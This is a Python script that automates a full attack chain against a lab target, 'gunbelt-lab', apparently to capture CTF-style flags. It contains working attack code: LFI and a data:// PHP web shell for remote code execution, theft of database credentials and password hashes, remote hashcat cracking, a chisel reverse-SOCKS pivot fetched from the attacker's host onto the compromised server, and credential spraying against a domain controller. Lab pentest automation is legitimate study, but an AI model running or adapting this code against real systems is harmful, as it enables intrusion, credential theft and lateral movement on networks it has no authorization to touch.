#!/usr/bin/env python3
"""
gunbelt carousel — async best-first pentest control loop.  Target: gunbelt-lab (your-host).

Thesis: same kill-chain a serial operator would walk, but fired as a CONCURRENT frontier
— breadth-parallel, depth confirmation-gated, machine-graded — owns the box in a fraction
of the wall-clock.

  * STATE    = facts{} + flags{} + creds[] + timestamped event log + shot counter
  * LANE     = coroutine gated on a precondition over facts; on success EMITS new
               facts/flags/creds that unlock downstream lanes.
  * SCHEDULER= event-driven (NOT tick-barrier): every lane runs as its own task the
               instant its precondition holds; each completion re-scans for newly
               unlocked lanes.  A slow lane never blocks a ready one.
  * SHOTS    = every external command is a real subprocess (curl/dig/smbclient/php-RCE/
               chisel/proxychains/remote-hashcat).  Grading = deterministic verify
               predicates (the 1.7b reflex grader is the swap-in for AMBIGUOUS in-band
               results; deterministic predicates are faster + correct for this box).
"""
import asyncio, time, base64, os, shlex, json, re

# ---------------------------------------------------------------- target / infra config
EDGE = os.environ.get("GB_EDGE", "172.30.0")
INT  = os.environ.get("GB_INT",  "172.31.0")
FTP, DNS, SMB, WEB = f"{EDGE}.11", f"{EDGE}.12", f"{EDGE}.13", f"{EDGE}.20"
WEBU = f"http://{WEB}"
GW = f"{EDGE}.1"                       # your-host gateway on edge net (reachable from web container)
CHP, HTP, SKP = 39901, 39902, 39903   # chisel-rev / http-serve / reverse-socks (high, collision-free)
CHISEL = "/usr/local/bin/chisel"
GPU_HOST = "om@192.0.2.10"         # your-host; crack on GPU1 (never GPU0)
ROCKYOU = "/usr/share/wordlists/rockyou.txt"
WORK = os.environ.get("GB_WORK", "/tmp/gb-carousel")
PHP_SYS = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="   # <?php system($_GET['c']); ?>
FLAG_RE = re.compile(r"FLAG\{[^}\s\"']+\}")

os.makedirs(WORK, exist_ok=True)
T0 = time.monotonic()
def now(): return time.monotonic() - T0

# ---------------------------------------------------------------- state
class State:
    def __init__(self):
        self.facts=set(); self.data={}; self.flags={}; self.creds=[]
        self.shots=0; self.log=[]; self.inflight=0; self.max_conc=0
    def emit(self,f,p=None):
        if p is not None: self.data[f]=p
        self.facts.add(f)
    def have(self,*f): return all(x in self.facts for x in f)
    def flag(self,name,val):
        if val and name not in self.flags:
            self.flags[name]=val; self.event("FLAG",name,val,"CONFIRMED")
    def cred(self,u,s,note=""):
        if (u,s) not in [(a,b) for a,b,_ in self.creds]:
            self.creds.append((u,s,note)); self.event("CRED",f"{u}:{s}",note,"CONFIRMED")
    def event(self,kind,lane,detail,verdict):
        d=(detail[:90]+"…") if len(str(detail))>90 else detail
        self.log.append((now(),kind,lane,detail,verdict))
        print(f"[{now():6.2f}s] {kind:6s} {lane:14s} {verdict:9s} {d}",flush=True)
S=State()

# ---------------------------------------------------------------- shot runner
async def sh(cmd,timeout=25,shot=True):
    if shot: S.shots+=1
    S.inflight+=1; S.max_conc=max(S.max_conc,S.inflight)
    try:
        p=await asyncio.create_subprocess_shell(cmd,stdout=asyncio.subprocess.PIPE,
                                                stderr=asyncio.subprocess.STDOUT)
        try: out,_=await asyncio.wait_for(p.communicate(),timeout=timeout)
        except asyncio.TimeoutError:
            try: p.kill()
            except Exception: pass
            return (124,"")
        return (p.returncode,out.decode(errors="replace"))
    finally: S.inflight-=1

def _q(s): return shlex.quote(str(s))

async def rce(cmd,timeout=25):
    c=(f"curl -s --max-time {timeout-2} -G {WEBU}/index.php "
       f"--data-urlencode 'page=data://text/plain;base64,{PHP_SYS}' --data-urlencode c={_q(cmd)}")
    return (await sh(c,timeout=timeout))[1]

async def rce_php(script,timeout=30):
    b=base64.b64encode(script.encode()).decode()
    fn=f"/tmp/.gb{abs(hash(script))%100000}.php"
    return await rce(f"echo {b}|base64 -d>{fn}&&php {fn} 2>/dev/null;rm -f {fn}",timeout=timeout)

def grab_flags(text,name):
    for m in FLAG_RE.findall(text or ""): S.flag(name,m)

# ---------------------------------------------------------------- lanes
async def lane_ftp():
    listing=(await sh(f"curl -s --max-time 10 'ftp://anonymous:anonymous@{FTP}/'"))[1]
    for f in [ln.split()[-1] for ln in listing.splitlines() if ln.strip()]:
        grab_flags((await sh(f"curl -s --max-time 8 'ftp://anonymous:anonymous@{FTP}/{f}'"))[1],"ftp")
    S.emit("ftp_done")

async def lane_dns():
    for z in ("inlanefreight.local","lab.local","gunbelt.lab","corp.local"):
        out=(await sh(f"dig +short axfr @{DNS} {z}"))[1]
        grab_flags(out,"dns")
        if out.strip() and "failed" not in out: S.emit("dns_zone",z)
    S.emit("dns_done")

async def lane_smb():
    out=(await sh(f"smbclient -N -L //{SMB}"))[1]
    if "public" in out:
        d=f"{WORK}/smb"; os.makedirs(d,exist_ok=True)
        await sh(f"smbclient -N //{SMB}/public -c 'recurse ON;prompt OFF;lcd {d};mget *'")
        grab_flags((await sh(f"grep -rIh . {d} 2>/dev/null",shot=False))[1],"smb")
    S.emit("smb_done")

async def lane_webfp():
    out=(await sh(f"curl -s --max-time 8 {WEBU}/"))[1]
    if "WordPress" in out or "status.php" in out: S.emit("web_app")

async def lane_lfi():
    out=(await sh(f"curl -s --max-time 8 -G {WEBU}/index.php --data-urlencode 'page=../../../../../../etc/passwd'"))[1]
    if "root:x:0:0:" in out: S.event("LANE","lfi","index.php?page= LFI","CONFIRMED"); S.emit("lfi")
    else: S.event("LANE","lfi","no LFI","NEGATIVE")

async def lane_rce():
    out=await rce("id")
    if "uid=" in out: S.event("LANE","rce",out.strip(),"CONFIRMED"); S.emit("rce")
    else: S.event("LANE","rce","data:// failed","NEGATIVE")

async def lane_loot():
    grab_flags(await rce("cat /var/www/html/flag.txt 2>/dev/null"),"webroot")
    cfg=await rce("cat /var/www/html/wp-config.php /var/www/html/status.php 2>/dev/null")
    host=user=pw=None
    m=re.search(r'mysqli\("([^"]+)","([^"]+)","([^"]+)"',cfg)
    if m: host,user,pw=m.group(1),m.group(2),m.group(3)
    else:
        m2=re.search(r"DB_PASSWORD',\s*'([^']+)'",cfg)
        if m2:
            host=(re.search(r"DB_HOST',\s*'([^']+)'",cfg) or [None,"db"])[1]
            user=(re.search(r"DB_USER',\s*'([^']+)'",cfg) or [None,"root"])[1]
            pw=m2.group(1)
    if pw:
        S.emit("mysql_creds",(host,user,pw)); S.cred(user,pw,"mysql root (wp-config)")
    if "tom" in cfg and ("domain" in cfg.lower() or "dc." in cfg.lower()):
        S.event("INTEL","cred_reuse","svc tom reuses WP pw on the domain","CONFIRMED")
    S.emit("looted")

async def lane_scan():
    # Resolve the internal hosts by name via the web container's docker DNS (instant,
    # reliable) rather than sweeping the /24 (dead hosts hang fsockopen to timeout).
    r=await rce_php('<?php foreach(["db","dc","dc01","smb"] as $h){$ip=gethostbyname($h);'
                    'if($ip!=$h)echo "$h=$ip\\n";}')
    for ln in r.splitlines():
        if "=" not in ln: continue
        k,v=ln.split("=",1); v=v.strip()
        if not v.startswith(INT): continue
        if k=="db": S.emit("db_ip",v)
        if k in ("dc","dc01"): S.emit("dc_ip",v)
    # confirm the two hops are actually live (targeted, fast)
    php=(f'<?php foreach([["{INT}",0]] as $x){{}}'
         f'$t=[["db",3306],["dc",445]];foreach($t as $p){{$f=@fsockopen($p[0],$p[1],$e,$s,1);'
         f'echo $p[0].":".$p[1].($f?" OPEN":" closed")."\\n";}}')
    live=await rce_php(php)
    if S.have("dc_ip"):
        S.event("LANE","scan",f"db={S.data.get('db_ip')} dc={S.data.get('dc_ip')} [{live.strip().replace(chr(10),' ')}]","CONFIRMED")

async def lane_mysql():
    host,user,pw=S.data["mysql_creds"]
    php=(f'<?php $c=new mysqli("{host}","{user}","{pw}");if($c->connect_errno){{echo"CF";exit;}}'
         f'$r=$c->query("SHOW DATABASES");while($d=$r->fetch_row()){{$db=$d[0];'
         f'if(in_array($db,["information_schema","performance_schema","sys","mysql"]))continue;'
         f'$c->select_db($db);$t=$c->query("SHOW TABLES");while($tt=$t->fetch_row()){{'
         f'$rows=$c->query("SELECT * FROM `".$tt[0]."` LIMIT 50");'
         f'if($rows)while($row=$rows->fetch_assoc())echo json_encode($row)."\\n";}}}}')
    out=await rce_php(php); hashes=[]
    for ln in out.splitlines():
        grab_flags(ln,"mysql")
        try: row=json.loads(ln)
        except Exception: continue
        u,h=row.get("user_login"),row.get("user_pass")
        if u and h and h.startswith("$P$"): hashes.append((u,h))
    if hashes: S.emit("hashes",hashes); S.event("LANE","mysql",f"{len(hashes)} phpass hashes","CONFIRMED")

async def lane_crack():
    hashes=S.data["hashes"]; hf=f"{WORK}/hashes.txt"
    with open(hf,"w") as f:
        for u,h in hashes: f.write(f"{h}\n")
    # crack on your-host GPU1 (never GPU0)
    remote=(f"cat>/tmp/gbh.txt<<'EOF'\n"+"\n".join(h for _,h in hashes)+"\nEOF\n"
            f"rm -f /tmp/gbh.pot;CUDA_VISIBLE_DEVICES=1 hashcat -m 400 -a 0 -d 1 --quiet "
            f"--potfile-path=/tmp/gbh.pot -o /tmp/gbh.out /tmp/gbh.txt {ROCKYOU} >/dev/null 2>&1;"
            f"cat /tmp/gbh.out")
    b=base64.b64encode(remote.encode()).decode()
    out=(await sh(f"ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no {GPU_HOST} "
                  f"'echo {b}|base64 -d|bash'",timeout=180))[1]
    cracked={}
    for ln in out.splitlines():
        if ":" in ln:
            hsh,pwv=ln.split(":",1); cracked[hsh.strip()]=pwv.strip()
    for u,h in hashes:
        if h in cracked: S.cred(u,cracked[h],"cracked phpass (GPU1)")
    S.emit("cracked")

async def lane_pivot():
    await sh(f"cp -f {CHISEL} {WORK}/chisel",shot=False)
    await sh(f"fuser -k {HTP}/tcp {CHP}/tcp {SKP}/tcp 2>/dev/null;sleep 1",shot=False,timeout=8)
    await sh(f"cd {WORK}&&setsid python3 -m http.server {HTP} >/tmp/gbhs.log 2>&1 </dev/null &",shot=False)
    await sh(f"setsid {CHISEL} server --reverse -p {CHP} >/tmp/gbchs.log 2>&1 </dev/null &",shot=False)
    await asyncio.sleep(2)
    # web pulls chisel (verify size), then reverse-socks back
    for _ in range(3):
        pull=await rce(f"rm -f /tmp/.gbch;curl -s -m 8 -o /tmp/.gbch http://{GW}:{HTP}/chisel "
                       f"-w '%{{size_download}}';chmod +x /tmp/.gbch;stat -c%s /tmp/.gbch")
        if "8654848" in pull or (pull.strip().split() and pull.strip().split()[-1].isdigit()
                                 and int(pull.strip().split()[-1])>100000):
            break
        await asyncio.sleep(1)
    await rce(f"setsid /tmp/.gbch client {GW}:{CHP} R:{SKP}:socks >/tmp/.gbchl 2>&1 </dev/null & echo go")
    for _ in range(12):
        if (await sh(f"bash -c 'echo>/dev/tcp/127.0.0.1/{SKP}'",shot=False,timeout=3))[0]==0:
            S.emit("socks_up"); S.event("LANE","pivot",f"reverse SOCKS :{SKP} up","CONFIRMED"); return
        await asyncio.sleep(1)
    S.event("LANE","pivot","socks failed","NEGATIVE")

async def lane_dc():
    dc=S.data.get("dc_ip",f"{INT}.40"); conf=f"{WORK}/pc.conf"
    with open(conf,"w") as f: f.write(f"[ProxyList]\nsocks5 127.0.0.1 {SKP}\n")
    PC=f"proxychains4 -q -f {conf}"
    seen=set()
    for u,sec,_ in S.creds:            # spray every credential we hold at the DC
        if not sec or (u,sec) in seen: continue
        seen.add((u,sec))
        # Real-auth test: rpcclient getusername is authenticated-only. A bogus user maps to
        # guest (Bad SMB2 signature); a real user with a wrong pass gives LOGON_FAILURE;
        # only genuine creds return "Account Name: <u>". smbclient -L is NOT proof — the box
        # allows guest share-listing, so it green-lights anything.
        out=(await sh(f"{PC} rpcclient -U {_q(u)}%{_q(sec)} {dc} "
                      f"-c 'getusername;enumdomusers' 2>&1",timeout=25))[1]
        if re.search(rf"Account Name:\s*{re.escape(u)}\b",out,re.I) and "nobody" not in out.lower():
            users=re.findall(r"user:\[([^\]]+)\]",out)
            S.event("LANE","dc_auth",f"{u}:{sec} AUTHENTICATED (domain users: {','.join(users)})","CONFIRMED")
            S.emit("dc_owned"); S.data["dc_user"]=(u,sec)
            # authenticated loot sweep for any flag material
            ls=(await sh(f"{PC} smbclient -L //{dc} -U {_q(u)}%{_q(sec)} 2>&1",timeout=20))[1]
            shares=[l.split()[0] for l in ls.splitlines() if "Disk" in l and not l.split()[0].endswith("$")]
            for s in shares+["flag","share"]:
                dump=(await sh(f"{PC} smbclient //{dc}/{s} -U {_q(u)}%{_q(sec)} "
                               f"-c 'recurse ON;prompt OFF;lcd {WORK};mget *' 2>&1",timeout=15))[1]
                grab_flags(dump,"dc")
            return
        else:
            reason=("LOGON_FAILURE" if "LOGON_FAILURE" in out else
                    "guest/not-authenticated" if "Bad SMB2" in out or "signature" in out else "rejected")
            S.event("LANE","dc_auth",f"{u}:{sec} {reason}","NEGATIVE")

# ---------------------------------------------------------------- scheduler (event-driven)
LANES={
 "ftp":   (lambda:True,                       lane_ftp),
 "dns":   (lambda:True,                       lane_dns),
 "smb":   (lambda:True,                       lane_smb),
 "webfp": (lambda:True,                       lane_webfp),
 "lfi":   (lambda:S.have("web_app"),          lane_lfi),
 "rce":   (lambda:S.have("lfi"),              lane_rce),
 "loot":  (lambda:S.have("rce"),              lane_loot),
 "scan":  (lambda:S.have("rce"),              lane_scan),
 "mysql": (lambda:S.have("rce") and "mysql_creds" in S.data, lane_mysql),
 "crack": (lambda:S.have("hashes"),           lane_crack),
 "pivot": (lambda:S.have("rce"),              lane_pivot),
 "dc":    (lambda:S.have("socks_up") and S.have("dc_ip") and any(s for _,s,_ in S.creds), lane_dc),
}

async def carousel():
    fired=set(); tasks={}
    def launch():
        for name,(pre,coro) in LANES.items():
            if name not in fired and pre():
                fired.add(name); t=asyncio.create_task(coro()); tasks[t]=name
                S.event("FIRE",name,"","launched")
    launch()
    while tasks:
        done,_=await asyncio.wait(list(tasks),return_when=asyncio.FIRST_COMPLETED)
        for t in done:
            tasks.pop(t,None)
            try: t.result()
            except Exception as e: S.event("ERR","lane",str(e),"EXC")
        launch()

async def main():
    S.event("START","carousel",f"target gunbelt-lab web={WEB}","-")
    await carousel()
    dt=now()
    print("\n"+"="*72)
    print(f"RESULT  wall={dt:.2f}s  shots={S.shots}  max_concurrency={S.max_conc}  "
          f"flags={len(S.flags)}/3  dc_owned={S.have('dc_owned')}")
    for k,v in S.flags.items(): print(f"   FLAG {k:9s} {v}")
    for u,s,n in S.creds:       print(f"   CRED {u}:{s}  [{n}]")
    if S.have("dc_owned"): print(f"   DC   owned as {S.data.get('dc_user')}")
    print("="*72)
    du=S.data.get("dc_user")
    json.dump({"engine":"mine (carousel)","wall_s":round(dt,2),"shots":S.shots,
               "max_conc":S.max_conc,"flags":S.flags,"dc_owned":S.have("dc_owned"),
               "dc_cred":(f"{du[0]}:{du[1]}" if du else None),
               "creds_source":"derived (GPU1 phpass crack)",
               "dc_detection":"rpcclient getusername (guest-proof)",
               "pivot":"chisel reverse-SOCKS through web RCE",
               "creds":[[u,s,n] for u,s,n in S.creds],
               "timeline":[[round(t,2),k,l,v] for t,k,l,_d,v in S.log]},
              open(f"{WORK}/result.json","w"),indent=2)

if __name__=="__main__":
    asyncio.run(main())
